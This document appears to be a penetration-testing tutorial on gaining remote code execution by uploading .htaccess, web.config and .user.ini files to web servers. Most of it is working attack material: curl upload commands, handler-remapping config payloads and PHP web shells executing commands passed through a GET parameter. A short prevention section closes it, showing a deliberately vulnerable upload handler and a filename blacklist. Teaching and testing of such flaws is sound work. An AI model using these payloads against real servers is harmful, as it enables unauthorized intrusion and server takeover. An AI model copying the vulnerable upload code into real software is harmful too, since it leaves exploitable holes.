# 3.1 .htaccess & web.config Upload

## Goal

Upload server configuration files to modify how server processes files, enabling code execution of uploaded files.

---

## Part 1: .htaccess (Apache)

### Discovery

Check if server is Apache:
```bash
# Check headers
curl -I http://target/index.php | grep Server
# Look for: Apache/2.x

# Try accessing .htaccess
curl http://target/.htaccess
# If 403 Forbidden or content shown, it exists
```

### Basic .htaccess Exploitation

**Payload 1: Change file type handler**

```apache
AddType application/x-httpd-php .evil
```

**How it works:**
```
Normal: .php files → executed as PHP
After upload:  .evil files → executed as PHP
Upload: shell.evil
Access: /uploads/shell.evil → RCE!
```

**Full exploitation:**

```bash
# Create .htaccess
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .evil
EOF

# Upload .htaccess
curl -F "file=@.htaccess" http://target/upload.php

# Create shell
echo '<?php system($_GET["c"]); ?>' > shell.evil

# Upload shell
curl -F "file=@shell.evil" http://target/upload.php

# Execute
curl http://target/uploads/shell.evil?c=id
```

### Advanced .htaccess Payloads

**Payload 2: Change multiple extensions**

```apache
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt
```

**Payload 3: Execute files via location**

```apache
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Payload 4: Disable restrictions**

```apache
php_flag safe_mode off
php_flag display_errors on
php_value memory_limit 200M
```

**Payload 5: Remote code execution via error documents**

```apache
ErrorDocument 404 /shell.php
```

### .htaccess Location Matters

```
Upload to /uploads/.htaccess → affects /uploads/ directory only
Upload to /images/.htaccess → affects /images/ directory only
Upload to /.htaccess → affects entire site (if allowed)
```

### Testing .htaccess

```bash
# 1. Upload test .htaccess
echo "AddType text/plain .php" > .htaccess
curl -F "file=@.htaccess" http://target/uploads/

# 2. Upload PHP file as .txt
echo '<?php system("id"); ?>' > test.txt
curl -F "file=@test.txt" http://target/uploads/

# 3. Try accessing
curl http://target/uploads/test.txt

# 4. If PHP executes instead of showing, .htaccess works!
```

## Part 2: web.config (IIS)

### Discovery

Check if server is IIS:
```bash
curl -I http://target/index.php | grep Server
# Look for: IIS/10.0, IIS/8.5, etc
```

### Basic web.config Exploitation

**Payload: Change handler mapping**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script">
      <add name="PHP_VIA_JPG" 
           path="*.jpg" 
           verb="GET,POST,HEAD"
           modules="CgiModule"
           scriptProcessor="C:\php\php-cgi.exe"
           resourceType="Either"
           requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
```

**How it works:**
```
IIS config normally: .jpg files → serve as images
After upload: .jpg files → execute as PHP
Upload: shell.jpg (containing PHP)
Access: /uploads/shell.jpg → RCE!
```

### Advanced web.config Payloads

**Payload 2: Multiple extensions**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP_VIA_JPG" path="*.jpg" ... />
      <add name="PHP_VIA_PNG" path="*.png" ... />
      <add name="PHP_VIA_GIF" path="*.gif" ... />
    </handlers>
  </system.webServer>
</configuration>
```

**Payload 3: Aspx execution**

```xml
<add name="PHP" 
     path="*" 
     modules="IsapiModule" 
     scriptProcessor="C:\php\php-cgi.exe" />
```

### Testing web.config

```bash
# 1. Create web.config
cat > web.config << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP_VIA_JPG" path="*.jpg" modules="CgiModule" scriptProcessor="C:\php\php-cgi.exe" />
    </handlers>
  </system.webServer>
</configuration>
EOF

# 2. Upload web.config
curl -F "file=@web.config" http://target/uploads/

# 3. Upload PHP as JPG
echo '<?php system("whoami"); ?>' > shell.jpg
curl -F "file=@shell.jpg" http://target/uploads/

# 4. Access
curl http://target/uploads/shell.jpg
```

## Part 3: .user.ini (PHP-FPM)

### Discovery

Check if PHP-FPM:
```bash
# PHP-FPM often used with Nginx
# Check server header or error messages
```

### Basic .user.ini Exploitation

**Payload: Auto-prepend PHP file**

```ini
auto_prepend_file = /var/www/uploads/shell.php
```

**How it works:**
```
Normally: PHP files execute normally
After .user.ini: Any PHP file in that directory 
                 automatically includes shell.php first
Result: PHP code from shell.php executes
```

**Exploitation:**

```bash
# 1. Create .user.ini
cat > .user.ini << 'EOF'
auto_prepend_file = /var/www/uploads/shell.php
EOF

# 2. Upload .user.ini
curl -F "file=@.user.ini" http://target/uploads/

# 3. Create minimal PHP file
echo "" > index.php
curl -F "file=@index.php" http://target/uploads/

# 4. When index.php is accessed, shell.php executes first
curl http://target/uploads/index.php
```

### .user.ini Variants

**Payload 2: Auto-append**

```ini
auto_append_file = /var/www/uploads/shell.php
```

**Payload 3: Error handler**

```ini
error_append_string = <?php system($_GET['c']); ?>
```

## Real-World Exploitation Flow

### Example 1: .htaccess Attack

```
1. Application allows file upload to /uploads/
2. No validation on uploaded files
3. Attacker uploads .htaccess with:
   AddType application/x-httpd-php .jpg
4. Attacker uploads shell.jpg (contains PHP)
5. Accesses /uploads/shell.jpg
6. Server executes as PHP → RCE
```

### Example 2: web.config Attack

```
1. IIS server with upload functionality
2. web.config not protected
3. Attacker uploads malicious web.config
4. web.config maps *.jpg to PHP handler
5. Attacker uploads shell.jpg
6. GET /uploads/shell.jpg → RCE
```

### Example 3: .user.ini Attack

```
1. PHP-FPM based hosting
2. Upload to /public_html/
3. Attacker uploads .user.ini with auto_prepend_file
4. Any PHP file in folder now includes attacker shell
5. Access any PHP file → RCE
```

## Prevention (For Developers)

❌ **Bad:** Allow config file uploads

```php
$allowed = ['jpg', 'png', 'gif'];
if (in_array(getExtension($_FILES['file']['name']), $allowed)) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
// VULNERABLE: .htaccess and other config files bypassed
```

✅ **Good:** Blacklist config files

```php
$blocked = ['.htaccess', 'web.config', '.user.ini', '.php', '.php5', '.phtml'];
$filename = $_FILES['file']['name'];
foreach ($blocked as $bad) {
    if (strpos($filename, $bad) !== false) {
        die("File type not allowed");
    }
}
```

✅ **Better:** Whitelist extensions + prevent execution

```php
// Whitelist extensions
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die("Invalid file type");
}

// Generate safe filename
$new_name = uniqid() . '.' . $ext;

// Store in non-web-accessible directory
$upload_dir = '/home/user/private_uploads/';  // NOT in /var/www/
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $new_name);

// Serve via PHP (no direct execution)
// When user requests image:
// header('Content-Type: image/jpeg');
// readfile('/home/user/private_uploads/' . $filename);
```

## Detection Indicators

**Config file upload vulnerable if:**
- ✅ Can upload .htaccess without blocking
- ✅ Can upload web.config without blocking
- ✅ Can upload .user.ini without blocking
- ✅ File executes uploaded code after

**Not vulnerable if:**
- ❌ Blocked by filename filter
- ❌ Stored outside web root
- ❌ Config files cannot modify behavior
- ❌ Execution permissions properly restricted
